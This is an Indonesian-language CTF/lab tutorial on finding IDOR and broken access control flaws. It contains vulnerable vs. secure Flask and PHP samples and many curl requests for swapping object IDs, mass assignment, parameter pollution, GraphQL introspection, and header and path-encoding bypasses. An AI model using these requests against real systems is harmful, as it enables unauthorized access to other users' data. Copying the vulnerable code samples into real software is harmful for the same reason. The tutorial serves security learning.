---
id: "27"
title: "🔐 27 — IDOR / Access Control Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "27_idor_access_control_workflow.md"
refs_out: ["19","20","22","23","24","25","26","28","30"]
refs_in: ["20","28","31","33","34"]
---

← [File 26: Command Injection](/docs/command-injection)

# 🔐 27 — IDOR / Access Control Workflow

> **Category:** Web Exploitation  
> **Difficulty:** Fundamental → Intermediate → Advanced  
> **Type:** Broken Access Control / IDOR  
> **Prerequisites:** File 01–26, terutama HTTP, Authentication, API, JavaScript, LFI/RFI, File Upload, SSRF, SSTI, SQL Injection, XSS  
> **Target:** HackTheBox, TryHackMe, PortSwigger, CTF/lab yang memang mengizinkan pengujian  
> **Environment:** Parrot OS XFCE / Debian-based
> 
> **Core Objective:** membangun reflex untuk menjawab satu pertanyaan:
> 
> **“User yang sedang login benar-benar berhak mengakses object ini, atau server hanya mempercayai reference yang dikirim client?”**

---

# 📚 Daftar Isi

- [0 — Fundamentals](#0--fundamentals)
    
    - [0.1 Apa Itu IDOR](#01-apa-itu-idor)
        
    - [0.2 Jenis-Jenis IDOR](#02-jenis-jenis-idor)
        
    - [0.3 Attack Surface untuk IDOR/Access Control](#03-attack-surface-untuk-idoraccess-control)
        
- [1 — Reconnaissance IDOR](#1--reconnaissance-idor)
    
    - [1.1 Cara Identifikasi Target IDOR](#11-cara-identifikasi-target-idor)
        
    - [1.2 Tools untuk Reconnaissance](#12-tools-untuk-reconnaissance)
        
    - [1.3 ID Pattern Recognition](#13-id-pattern-recognition)
        
- [2 — Exploitation Teknik](#2--exploitation-teknik)
    
    - [2.1 Basic IDOR — Horizontal Access Control](#21-basic-idor--horizontal-access-control)
        
    - [2.2 Vertical Privilege Escalation via IDOR](#22-vertical-privilege-escalation-via-idor)
        
    - [2.3 Mass Assignment](#23-mass-assignment)
        
    - [2.4 Parameter Pollution untuk IDOR](#24-parameter-pollution-untuk-idor)
        
    - [2.5 IDOR pada File Download](#25-idor-pada-file-download)
        
    - [2.6 IDOR pada API REST](#26-idor-pada-api-rest)
        
    - [2.7 IDOR pada GraphQL](#27-idor-pada-graphql)
        
- [3 — Bypass Teknik](#3--bypass-teknik)
    
    - [3.1 Bypass Access Control Checks](#31-bypass-access-control-checks)
        
    - [3.2 Forced Browsing](#32-forced-browsing)
        
    - [3.3 IDOR dalam JWT Claims](#33-idor-dalam-jwt-claims)
        
- [4 — Automation & Tools](#4--automation--tools)
    
    - [4.1 Manual Testing dengan curl](#41-manual-testing-dengan-curl)
        
    - [4.2 Burp Suite untuk IDOR](#42-burp-suite-untuk-idor)
        
    - [4.3 Script idor_test.sh](#43-script-idor_testsh)
        
- [5 — Access Control Misconfiguration](#5--access-control-misconfiguration)
    
    - [5.1 Missing Function Level Access Control](#51-missing-function-level-access-control)
        
    - [5.2 Role Manipulation](#52-role-manipulation)
        
    - [5.3 API Versioning Issues](#53-api-versioning-issues)
        
    - [5.4 State Machine Bypass](#54-state-machine-bypass)
        
- [6 — Decision Tree](#6--decision-tree)
    
- [7 — Common Errors & Troubleshooting](#7--common-errors--troubleshooting)
    
- [8 — Golden Rules](#8--golden-rules)
    
- [9 — Final Checklist](#9--final-checklist)
    
- [10 — Cross-Workflow Mental Model](#10--cross-workflow-mental-model)
    
- [11 — One-Line Muscle Memory](#11--one-line-muscle-memory)
    

---

# 🧠 0 — Fundamentals

# 0.1 Apa Itu IDOR

## Definisi

**IDOR (Insecure Direct Object Reference)** adalah kondisi ketika aplikasi mengekspos reference ke object dan server gagal memastikan bahwa user yang mengirim reference tersebut memang berhak mengakses object itu.

Contoh sederhana:

```text
User A login
    │
    ▼
GET /api/users/100
    │
    ▼
Server
    │
    ▼
Object #100 → User A
```

Kemudian user A mengganti:

```text
/api/users/100
```

menjadi:

```text
/api/users/101
```

Jika:

```text
Object #101 → User B
```

dan server mengembalikan data User B, maka terdapat **horizontal access control failure / IDOR**.

---

## Model Mental

```text
┌──────────────┐
│ User Request │
│              │
│ object_id=101│
└──────┬───────┘
       │
       ▼
┌────────────────────┐
│ Application Server │
│                    │
│ "Saya punya ID 101"│
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Object Lookup      │
│                    │
│ SELECT ...         │
│ WHERE id = 101     │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Authorization ?    │
│                    │
│ Is current user    │
│ owner of object?   │
└─────────┬──────────┘
          │
     ┌────┴────┐
     │         │
     ▼         ▼
    YES        NO
     │         │
     ▼         ▼
  Return    403/404
  object
```

Masalah IDOR muncul ketika bagian terakhir tidak benar-benar ada atau salah.

---

## IDOR vs Broken Access Control

Ini wajib dibedakan.

### Broken Access Control (BAC)

**Broken Access Control** adalah kategori yang lebih luas:

```text
Authorization failure
        │
        ├── Horizontal privilege issue
        ├── Vertical privilege issue
        ├── Missing function authorization
        ├── IDOR
        ├── Forced browsing
        ├── Role manipulation
        └── State-machine bypass
```

### IDOR

IDOR lebih spesifik:

```text
User controls object reference
            ↓
Server does not properly enforce ownership/authorization
            ↓
Unauthorized object access
```

Jadi:

```text
IDOR ⊂ Broken Access Control
```

Tidak semua BAC adalah IDOR.

Contoh **BAC tanpa IDOR**:

```text
GET /admin/users
```

Jika user biasa dapat masuk ke endpoint admin tanpa object reference yang dimanipulasi, ini adalah **missing function-level authorization**, bukan IDOR klasik.

---

## Kondisi yang Membuat IDOR Terjadi

Biasanya kombinasi:

```text
1. Client mengontrol object reference
2. Object reference mengarah ke resource tertentu
3. Server menerima reference tersebut
4. Authorization check tidak ada / salah
5. Resource milik user lain dapat diakses
```

---

# 🐍 Flask — Vulnerable vs Aman

## Vulnerable

```python
# Vulnerable example: the object ID comes directly from the client.
@app.get("/api/orders/<int:order_id>")
def get_order(order_id):
    order = Order.query.get_or_404(order_id)

    # No ownership or role check is performed here.
    return jsonify({
        "id": order.id,
        "owner_id": order.owner_id,
        "total": order.total
    })
```

Problem:

```text
GET /api/orders/100
GET /api/orders/101
GET /api/orders/102
```

Jika semua bisa diakses user yang sama, authorization rusak.

---

## Aman

```python
# Secure example: bind the lookup to the authenticated user's ownership.
@app.get("/api/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = (
        Order.query
        .filter_by(
            id=order_id,
            owner_id=current_user.id
        )
        .first_or_404()
    )

    return jsonify({
        "id": order.id,
        "total": order.total
    })
```

Mental model aman:

```text
object_id
   +
current_user.id
   ↓
authorized lookup
```

Bukan:

```text
object_id
   ↓
object lookup
```

---

# 🐘 PHP — Vulnerable vs Aman

## Vulnerable

```php
<?php
// Vulnerable: object lookup depends only on client-controlled ID.

$id = $_GET['id'];

$stmt = $pdo->prepare(
    "SELECT id, email, phone
     FROM users
     WHERE id = ?"
);

$stmt->execute([$id]);

echo json_encode($stmt->fetch());
```

---

## Aman

```php
<?php
// Secure: bind the object lookup to the authenticated user.

session_start();

$currentUserId = $_SESSION['user_id'];
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($id === false || $id === null) {
    http_response_code(400);
    exit('Invalid ID');
}

$stmt = $pdo->prepare(
    "SELECT id, email, phone
     FROM users
     WHERE id = ?
       AND owner_id = ?"
);

$stmt->execute([
    $id,
    $currentUserId
]);

$user = $stmt->fetch();

if (!$user) {
    http_response_code(404);
    exit('Not found');
}

echo json_encode($user);
```

---

## Why Underreported?

IDOR sering tidak sepopuler SQL Injection atau XSS karena:

```text
tidak selalu menyebabkan crash
tidak selalu ada error
tidak selalu terlihat jelas
sering membutuhkan dua account
```

Tetapi impact-nya bisa tinggi:

```text
User A
  ↓
Customer B data
  ↓
Invoices
  ↓
Documents
  ↓
Private files
  ↓
Account actions
```

Jadi:

```text
"Simple URL parameter"
        ≠
"Low impact"
```

---

# 0.2 🔎 Jenis-Jenis IDOR

## Numeric ID IDOR

Contoh:

```text
/api/user/1
/api/user/2
/api/user/3
```

Attack:

```text
1 → 2
```

---

### 📌 Kapan Digunakan

Prioritaskan ketika ID terlihat sequential.

---

## UUID / GUID IDOR

Contoh:

```text
/api/users/550e8400-e29b-41d4-a716-446655440000
```

UUID yang random bukan berarti authorization aman.

UUID dapat bocor melalui:

```text
API response
public profile
HTML source
JavaScript
logs
emails
notifications
other endpoints
```

Flow:

```text
Public object
     ↓
UUID leaked
     ↓
Private endpoint
     ↓
UUID replay
     ↓
Authorization failure
```

---

### 📌 Kapan Digunakan

Jangan skip IDOR hanya karena melihat UUID.

Pertanyaannya bukan:

> "Bisa ditebak?"

Tetapi:

> "Kalau saya memiliki UUID ini, server memastikan saya berhak atau tidak?"

---

## Hash-Based IDOR

Misalnya aplikasi menggunakan:

```text
MD5("123")
```

sebagai identifier.

Hash dari input predictable tetap predictable.

Contoh model:

```text
1 → c4ca4238...
2 → c81e728d...
3 → eccbc87e...
```

---

### 📌 Kapan Digunakan

Gunakan ketika ID tampak seperti:

```text
32 hex characters
```

dan terlihat seperti MD5.

Untuk lab, lakukan reverse lookup lokal atau hitung kandidat ID.

---

## Path-Based & Extension-Based IDOR

Tidak semua IDOR menggunakan query parameter (`?id=123`). Banyak API modern dan web resource menggunakan URL path, file extension, atau subdomain:

1. **Path-Based dengan Trailing Slash**:
   ```text
   /api/users/123 vs /api/users/123/
   /api/v1/users/123 vs /api/v2/users/123
   ```
2. **Extension-Based IDOR**:
   ```text
   /reports/report_123.pdf
   /exports/data_123.csv
   /downloads/file_123.zip
   ```
3. **Subdomain-Based IDOR**:
   ```text
   user123.target.com → user124.target.com
   tenant1.target.com → tenant2.target.com
   ```

---

### 📌 Kapan Digunakan

Gunakan ketika ID berada di URL path, file extension, atau subdomain.

---

## Encoded IDOR

Contoh Base64:

```text
123
 ↓
MTIz
```

Server mungkin menerima:

```text
/api/user/MTIz
```

Decode:

```text
MTIz
 ↓
123
```

Jika object sequence masih dapat dimodifikasi:

```text
123 → 124
```

kemudian encode kembali.

---

### 📌 Kapan Digunakan

Gunakan ketika identifier terlihat encoded daripada random.

---

## Indirect IDOR

Parameter tidak selalu bernama:

```text
id
user_id
account_id
```

Bisa berupa:

```text
document
invoice
file
order
reference
slug
token
attachment
record
```

Contoh:

```text
/download?document=invoice_100
```

atau:

```json
{"reference":"ABC-1001"}
```

---

### 📌 Kapan Digunakan

Setiap kali menemukan parameter yang memilih **object**, bukan hanya parameter bernama `id`.

---

## Second-Order IDOR

Flow:

```text
User submits object A
      ↓
Server stores reference
      ↓
Later action reads object A
      ↓
Authorization check missing
      ↓
Unauthorized access
```

Contoh:

```text
POST /support/ticket
{
  "attachment_id": 123
}
```

Kemudian:

```text
GET /support/ticket/50
```

mengembalikan attachment milik user lain.

---

### 📌 Kapan Digunakan

Cari IDOR yang baru terlihat setelah:

```text
create
save
import
approve
share
export
notification
```

---

## Mass Assignment IDOR

Mass assignment adalah kasus ketika backend menerima object/field lebih banyak daripada yang seharusnya dapat dikontrol client.

Misalnya:

```json
{
  "name": "Alice",
  "email": "alice@example.com",
  "role": "admin"
}
```

Jika backend memasukkan seluruh field secara otomatis:

```text
client-controlled field
        ↓
model update
        ↓
authorization-sensitive property changed
```

Ini bisa menghasilkan **privilege escalation / access control failure**, walaupun tidak selalu merupakan IDOR klasik.

---

### 📌 Kapan Digunakan

Prioritaskan ketika API menerima JSON object dan memiliki:

```text
role
is_admin
owner_id
user_id
permissions
account_id
organization_id
```

---

# 0.3 🗺️ Attack Surface untuk IDOR/Access Control

|Location|Common Parameter|What to Test|
|---|---|---|
|URL path|`/users/123`|Ganti object ID|
|Query|`?user_id=123`|Ganti ID/reference|
|Request body|`{"user_id":123}`|Tukar owner/object|
|HTTP headers|`X-User-ID`|Test trust terhadap header|
|Cookies|`account_id=123`|Test client-controlled identity|
|GraphQL|`user(id:123)`|Modify query variables|
|WebSocket|`{"id":123}`|Modify message object ID|
|File download|`file_id=123`|Access another user's file|
|REST API|`/api/orders/123`|GET/PUT/PATCH/DELETE|
|PDF/export|`invoice_id=123`|Export another user's data|
|Email trigger|`user_id=123`|Trigger action for another user|
|Notification|`recipient_id=123`|Modify recipient/object|
|Admin APIs|`/api/admin/users/123`|Vertical authorization|
|Share links|`/share/abc123`|Test object binding|

---

# 🔎 1 — Reconnaissance IDOR

# 1.1 Cara Identifikasi Target IDOR

Gunakan tiga pertanyaan dasar:

```text
1. Di mana ada reference ke object milik user?
2. Apakah reference tersebut dapat dimanipulasi?
3. Apakah server memvalidasi ownership/authorization?
```

---

## Trace dari Login

Mental model:

```text
LOGIN
  ↓
Dashboard
  ↓
Profile API
  ↓
Orders API
  ↓
Files API
  ↓
Notifications API
  ↓
Export API
```

Cari identifier:

```text
user_id
account_id
order_id
file_id
document_id
invoice_id
organization_id
```

---

## Contoh Burp Request

```http
GET /api/orders/1042 HTTP/1.1
Host: target
Authorization: Bearer USER_A_TOKEN
```

Response:

```json
{
  "id": 1042,
  "owner_id": 100,
  "total": 500000
}
```

Catat:

```text
Current user = 100
Object owner = 100
Object ID = 1042
```

Kemudian uji:

```http
GET /api/orders/1043 HTTP/1.1
```

Jika:

```json
{
  "id": 1043,
  "owner_id": 101,
  "total": 900000
}
```

dan user A dapat melihatnya:

```text
IDOR confirmed
```

---

## Sequential ID

Jika terlihat:

```text
100
101
102
103
```

uji:

```text
99
101
102
```

jangan langsung:

```text
1–1,000,000
```

---

### 📌 Kapan Digunakan

Gunakan sequential testing saat response menunjukkan integer yang meningkat.

---

# 1.2 🛠️ Tools untuk Reconnaissance

## Burp Suite

Workflow:

```text
Browser
   ↓
Proxy
   ↓
Burp HTTP history
   ↓
Identify references
   ↓
Repeater
   ↓
Change ID
   ↓
Compare response
```

Praktik:

```text
Proxy → Intercept ON
Browser → Login
Browser → Browse application
Burp → HTTP history
```

Cari:

```text
GET /api/users/123
GET /api/orders/900
GET /api/files/ab12
POST /api/update
```

---

## Browser DevTools

Buka:

```text
F12
→ Network
→ Fetch/XHR
```

Cari:

```text
/api/
/graphql
/download
/export
/profile
/orders
/files
```

Klik request dan perhatikan:

```text
Request URL
Query String
Payload
Headers
Response
```

---

## ffuf

Untuk endpoint discovery:

```bash
# Discover common API/admin endpoints in an authorized CTF target.
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,204,301,302,307,401,403
```

Contoh output:

```text
# Example realistic output.
admin        [Status: 403, Size: 274]
api          [Status: 301, Size: 312]
graphql      [Status: 405, Size: 178]
users        [Status: 200, Size: 921]
```

---

## feroxbuster

```bash
# Enumerate directories and files on the authorized lab target.
feroxbuster \
  -u http://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## Grep ID Patterns

Save response:

```bash
# Save a known response for offline inspection.
curl -s \
  http://TARGET/profile \
  -o response.html
```

Search numeric IDs:

```bash
# Search for numeric ID-like values in the saved response.
grep -Eo '[0-9]{1,8}' response.html | sort -n | uniq
```

Search UUIDs:

```bash
# Search for UUID-like strings.
grep -Eoi \
  '[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}' \
  response.html
```

---

### 📌 Kapan Digunakan

Gunakan grep/regex setelah mendapatkan:

```text
HTML
JS bundle
API response
JSON
```

---

# 1.3 🔢 ID Pattern Recognition

|Pattern|Contoh|Cara Test|
|---|---|---|
|Sequential integer|`1`, `2`, `3`|Increment/decrement|
|UUID v4|`550e8400-e29b-41d4-a716-446655440000`|Cari kebocoran dari endpoint lain|
|UUID v1|`6f1e...`|Menggunakan timestamp + MAC address (lebih predictable dari v4 tetapi butuh info tambahan); prioritaskan cari UUID leak di API response/HTML source|
|MD5 hash|`c4ca4238a0b923820dcc509a6f75849b`|Test apakah hash berasal dari predictable ID|
|Base64|`MTIz`|Decode → modify → encode|
|Hex|`313233`|Hex decode → modify → encode|
|Username|`/profile/john`|Ganti username|
|Email|`user=john@example.com`|Ganti reference email|
|Slug|`/documents/my-invoice`|Modify object slug|
|Filename|`report_123.pdf`|Pattern mutation|
|Composite ID|`100-200`|Understand component semantics|
|Short token|`abc123`|Search token leak elsewhere|

### 📌 Kapan Digunakan

Gunakan pattern recognition untuk menentukan **mutability**, bukan semata-mata guessability.

---

# ⚔️ 2 — Exploitation Teknik

# 2.1 👥 Basic IDOR — Horizontal Access Control

Horizontal:

```text
USER A
  ↓
USER B
```

Role sama.

Contoh:

```text
User A → order 100
User B → order 101

A requests 101
```

---

## Step 1 — Register User A

```bash
# Register a dedicated lab account for User A.
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"userA","password":"PasswordA123!"}' \
  http://TARGET/register
```

Contoh:

```text
HTTP/1.1 201 Created

{"id":100,"username":"userA"}
```

---

## Step 2 — Register User B

```bash
# Register a second dedicated lab account for User B.
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"userB","password":"PasswordB123!"}' \
  http://TARGET/register
```

Contoh:

```text
HTTP/1.1 201 Created

{"id":101,"username":"userB"}
```

---

## Step 3 — Login User A

```bash
# Login as User A and save the session cookie.
curl -i \
  -c userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"userA","password":"PasswordA123!"}' \
  http://TARGET/login
```

Contoh:

```text
HTTP/1.1 200 OK
Set-Cookie: session=abc123
```

---

## Step 4 — Get User A Resource

```bash
# Access User A's own resource and establish the baseline.
curl -i \
  -b userA.cookies \
  http://TARGET/api/users/100
```

Expected:

```json
{
  "id":100,
  "username":"userA"
}
```

---

## Step 5 — Modify ID to User B

```bash
# Replace User A's object ID with User B's ID.
curl -i \
  -b userA.cookies \
  http://TARGET/api/users/101
```

Vulnerable output:

```json
{
  "id":101,
  "username":"userB"
}
```

Expected secure result:

```text
HTTP/1.1 403 Forbidden
```

atau:

```text
HTTP/1.1 404 Not Found
```

---

### 📌 Kapan Digunakan

Ini adalah **first test** ketika menemukan object reference.

Mental muscle memory:

```text
Own object
   ↓
Change reference
   ↓
Other user's object
```

---

# 2.2 ⬆️ Vertical Privilege Escalation via IDOR

Vertical:

```text
Normal User
     ↓
Admin object/function
```

Contoh:

```text
User:
GET /api/users/100

Admin:
GET /api/admin/users/100
```

Cari:

```text
/admin
/api/admin
/manage
/management
/dashboard/admin
```

---

## Test Admin Endpoint dengan User Token

```bash
# Request an admin endpoint using the ordinary User A session.
curl -i \
  -b userA.cookies \
  http://TARGET/api/admin/users
```

Vulnerable:

```text
HTTP/1.1 200 OK
```

Secure:

```text
HTTP/1.1 403 Forbidden
```

---

## Admin Object ID

```bash
# Test an admin-owned object using the ordinary user's session.
curl -i \
  -b userA.cookies \
  http://TARGET/api/admin/users/1
```

---

## Discover Admin Endpoint dari JS

```bash
# Download a JavaScript bundle discovered through the page source.
curl -s \
  http://TARGET/static/app.js \
  -o app.js
```

Cari:

```bash
# Search the JavaScript bundle for likely administrative routes.
grep -Eoi \
  '/[^"'\'' ]*(admin|manage|delete|users|roles|permissions)[^"'\'' ]*' \
  app.js | sort -u
```

Contoh output:

```text
/api/admin/users
/api/admin/roles
/api/admin/delete
/api/manage/accounts
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
ordinary user session
+
admin-looking endpoint
```

---

# 2.3 🧬 Mass Assignment

Mass assignment terjadi ketika backend melakukan sesuatu seperti:

```python
# Dangerous pattern: user-controlled fields are mapped wholesale.
user.update(request.json)
```

Payload lab:

```json
{
  "user_id": 1,
  "role": "admin",
  "is_admin": true
}
```

---

## Baseline

```bash
# Update only a legitimate field first to establish normal behavior.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"name":"Alice Updated"}' \
  http://TARGET/api/profile
```

---

## Add Hidden/Unexpected Fields

```bash
# Add authorization-sensitive fields to test for mass assignment.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{
    "name":"Alice",
    "user_id":1,
    "role":"admin",
    "is_admin":true
  }' \
  http://TARGET/api/profile
```

Indikator:

```json
{
  "id":100,
  "role":"admin",
  "is_admin":true
}
```

atau:

```text
HTTP 200
```

diikuti role escalation setelah re-login.

### 📌 Kapan Digunakan

Prioritaskan saat request body berisi object yang tampak:

```text
generic
model-like
large
JSON-based
```

dan server menerima unknown fields.

---

# 2.4 🧪 Parameter Pollution untuk IDOR

## Duplicate Parameter

```text
?user_id=123&user_id=456
```

Backend/framework bisa memiliki behavior berbeda:

```text
first value wins
last value wins
array
exception
```

---

## curl

```bash
# Test duplicate object ID parameters.
curl -i \
  -b userA.cookies \
  'http://TARGET/api/profile?user_id=100&user_id=101'
```

---

## Array Injection

```bash
# Test how the application handles repeated array-style object identifiers.
curl -i \
  -b userA.cookies \
  'http://TARGET/api/profile?user_id[]=100&user_id[]=101'
```

---

## Form Parameter Pollution

```bash
# Submit duplicate values in form encoding.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'user_id=100&user_id=101' \
  http://TARGET/api/profile
```

---

## JSON Duplicate Keys

JSON duplicate-key handling is parser-dependent.

```bash
# Test duplicate JSON keys only against an authorized lab parser.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"user_id":100,"user_id":101}' \
  http://TARGET/api/profile
```

### 📌 Kapan Digunakan

Gunakan hanya setelah menemukan:

```text
parameter parsing ambiguity
```

Jangan menganggap semua framework memproses duplicate key dengan cara sama.

---

# 2.5 📁 IDOR pada File Download

Contoh:

```text
/download?file=report_123.pdf
```

Uji:

```text
report_123.pdf
→
report_124.pdf
```

---

## Baseline

```bash
# Download the authenticated user's own lab document.
curl -i \
  -b userA.cookies \
  'http://TARGET/download?file=report_100.pdf' \
  -o own.pdf
```

---

## Manipulate Filename

```bash
# Request another predictable filename under the same authenticated session.
curl -i \
  -b userA.cookies \
  'http://TARGET/download?file=report_101.pdf' \
  -o other.pdf
```

Bandingkan:

```bash
# Compare downloaded file sizes.
wc -c own.pdf other.pdf
```

---

## File ID API

```bash
# Test a file object reference directly.
curl -i \
  -b userA.cookies \
  http://TARGET/api/files/abc123
```

Kemudian:

```bash
# Replace the reference with a second known lab file identifier.
curl -i \
  -b userA.cookies \
  http://TARGET/api/files/def456
```

---

## IDOR + Path Traversal

Jika endpoint memiliki behavior path-based:

```text
/api/files/123
```

dan input dapat memengaruhi path filesystem, analisis secara terpisah.

```bash
# Test path normalization only in an authorized lab.
curl -i \
  -b userA.cookies \
  'http://TARGET/api/files/../123'
```

> Jangan mencampuradukkan IDOR dan Path Traversal. Buktikan primitive masing-masing.

---

### 📌 Kapan Digunakan

Prioritaskan file download karena impact sering tinggi:

```text
invoice
document
resume
backup
private attachment
```

---

# 2.6 🌐 IDOR pada API REST

## GET

```bash
# Read object 123 as the current authenticated user.
curl -i \
  -b userA.cookies \
  http://TARGET/api/users/123
```

Kemudian:

```bash
# Test neighboring object 124 for horizontal authorization failures.
curl -i \
  -b userA.cookies \
  http://TARGET/api/users/124
```

---

## POST Body

```bash
# Attempt to create/update an object while referencing another owner's ID.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"user_id":124,"note":"LAB_TEST"}' \
  http://TARGET/api/notes
```

---

## PUT

```bash
# Attempt to modify another user's lab object using PUT.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"name":"MODIFIED_BY_USER_A"}' \
  http://TARGET/api/users/124
```

Expected secure:

```text
403
```

---

## PATCH

```bash
# Attempt a partial modification of another user's object.
curl -i \
  -b userA.cookies \
  -X PATCH \
  -H 'Content-Type: application/json' \
  -d '{"email":"changed@example.test"}' \
  http://TARGET/api/users/124
```

---

## DELETE

```bash
# Test whether a normal user can delete another user's lab object.
curl -i \
  -b userA.cookies \
  -X DELETE \
  http://TARGET/api/orders/124
```

---

## Method Matrix

```text
GET    → read
POST   → create/action
PUT    → replace/update
PATCH  → partial update
DELETE → delete
```

### 📌 Kapan Digunakan

Jangan hanya menguji GET.

Access control dapat salah hanya pada:

```text
PUT
PATCH
DELETE
POST
```

sementara GET aman.

---

# 2.7 🧩 IDOR pada GraphQL

GraphQL sering menggunakan structure:

```graphql
query {
  user(id: 100) {
    id
    email
  }
}
```

---

## Baseline

```bash
# Request User A's object using a GraphQL query.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { user(id: 100) { id username email } }"}' \
  http://TARGET/graphql
```

---

## Modify ID

```bash
# Replace User A's object ID with User B's known lab ID.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { user(id: 101) { id username email } }"}' \
  http://TARGET/graphql
```

---

## Introspection

Jika introspection aktif:

```bash
# Test whether GraphQL introspection is enabled on the authorized lab.
# Introspection query lengkap untuk IDOR hunting (queryType & mutationType)
curl -s \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ __schema { queryType { fields { name args { name type { name kind } } } } mutationType { fields { name args { name } } } } }"}' \
  http://TARGET/graphql

# Format GraphQL Query yang lebih berguna untuk IDOR:
# {
#   __schema {
#     queryType {
#       fields {
#         name
#         args {
#           name
#           type { name kind }
#         }
#       }
#     }
#     mutationType {
#       fields {
#         name
#         args { name }
#       }
#     }
#   }
# }
```

Cari field:

```text
user
users
order
orders
file
files
invoice
documents
admin
```

---

## Query dengan Variables

```bash
# Query an object through GraphQL variables.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{
    "query":"query GetUser($id:Int!){user(id:$id){id username email}}",
    "variables":{"id":101}
  }' \
  http://TARGET/graphql
```

### 📌 Kapan Digunakan

GraphQL harus diuji ketika object reference berada di:

```text
arguments
variables
nested object
mutation
```

---

# 🧱 3 — Bypass Teknik

# 3.1 🛡️ Bypass Access Control Checks

## HTTP Method Bypass

Misalnya:

```text
GET  /api/user/123 → 403
PUT  /api/user/123 → 200
```

Test:

```bash
# Test GET authorization first.
curl -i \
  -b userA.cookies \
  http://TARGET/api/users/101
```

```bash
# Test PUT on the same object to identify method-specific authorization gaps.
curl -i \
  -b userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"name":"LAB_TEST"}' \
  http://TARGET/api/users/101
```

---

### 📌 Kapan Digunakan

Gunakan ketika endpoint memiliki multiple methods.

---

## `X-Original-URL`

Beberapa reverse proxy/framework dapat memperlakukan header ini secara khusus.

```bash
# Test whether a lab reverse proxy honors an alternate internal URL header.
curl -i \
  -b userA.cookies \
  -H 'X-Original-URL: /admin/users' \
  http://TARGET/
```

---

## `X-Rewrite-URL`

```bash
# Test an alternate rewrite header in an authorized lab.
curl -i \
  -b userA.cookies \
  -H 'X-Rewrite-URL: /admin/users' \
  http://TARGET/
```

---

## `X-Forwarded-For`

**Penting:** header ini bukan universal authorization bypass.

Test hanya jika aplikasi memang menggunakan source IP sebagai policy signal.

```bash
# Test whether the lab application incorrectly trusts an attacker-controlled proxy IP header.
curl -i \
  -b userA.cookies \
  -H 'X-Forwarded-For: 127.0.0.1' \
  http://TARGET/admin
```

---

## `X-Custom-IP-Authorization`

Jika source/application memberi clue bahwa header ini digunakan:

```bash
# Test a custom IP-authorization header only when application behavior suggests it exists.
curl -i \
  -b userA.cookies \
  -H 'X-Custom-IP-Authorization: 127.0.0.1' \
  http://TARGET/admin
```

---

## `Forwarded`

```bash
# Test RFC-style Forwarded handling in an authorized lab.
curl -i \
  -b userA.cookies \
  -H 'Forwarded: for=127.0.0.1' \
  http://TARGET/admin
```

---

## Referer-Based Bypass

Misconfiguration example:

```text
if Referer contains /admin:
    allow
```

Test:

```bash
# Test whether authorization incorrectly trusts the Referer header.
curl -i \
  -b userA.cookies \
  -H 'Referer: http://TARGET/admin/' \
  http://TARGET/admin/users
```

---

## Content-Type Manipulation

Misconfigured endpoints can behave differently for:

```text
application/json
application/x-www-form-urlencoded
multipart/form-data
```

Test:

```bash
# Send the same logical object using URL-encoded form data.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'user_id=101' \
  http://TARGET/api/action
```

Kemudian:

```bash
# Compare with JSON parsing behavior.
curl -i \
  -b userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"user_id":101}' \
  http://TARGET/api/action
```

---

## Case Manipulation

Beberapa routing stack memiliki perbedaan case handling.

```bash
# Test a case variation of an endpoint path.
curl -i \
  -b userA.cookies \
  http://TARGET/Admin/users
```

Bandingkan:

```bash
# Compare the canonical lowercase route.
curl -i \
  -b userA.cookies \
  http://TARGET/admin/users
```

---

## Path Normalization

```bash
# Test a normalized path variant in an authorized lab.
curl -i \
  -b userA.cookies \
  http://TARGET/api/./admin/users
```

---

## URL Encoding

```bash
# Encode a slash or path component to test normalization differences.
curl -i \
  -b userA.cookies \
  'http://TARGET/api%2fadmin%2fusers'
```

---

## Double Encoding

```bash
# Test a second layer of URL encoding against a path-aware proxy/application.
curl -i \
  -b userA.cookies \
  'http://TARGET/api%252fadmin%252fusers'
```

> Jangan menganggap bypass ini pasti berhasil. Nilainya justru terletak pada mencari **parser discrepancy** antara proxy dan backend.

---

### 📌 Kapan Digunakan

Bypass hanya dilakukan setelah menemukan indikasi:

```text
403
+
endpoint valid
+
possible parser/proxy discrepancy
```

---

# 3.2 🚪 Forced Browsing

Forced browsing:

```text
User interface
    ↓
doesn't show endpoint
    ↓
attacker requests endpoint directly
```

Contoh:

```text
/admin
/admin/users
/admin/delete
/api/internal
```

---

## Cari JS Source

```bash
# Download a frontend JavaScript bundle in the authorized target.
curl -s \
  http://TARGET/static/app.js \
  -o app.js
```

Cari endpoint:

```bash
# Extract strings that look like API/admin routes.
grep -Eo \
  '(/api/|/admin/)[A-Za-z0-9_./-]+' \
  app.js | sort -u
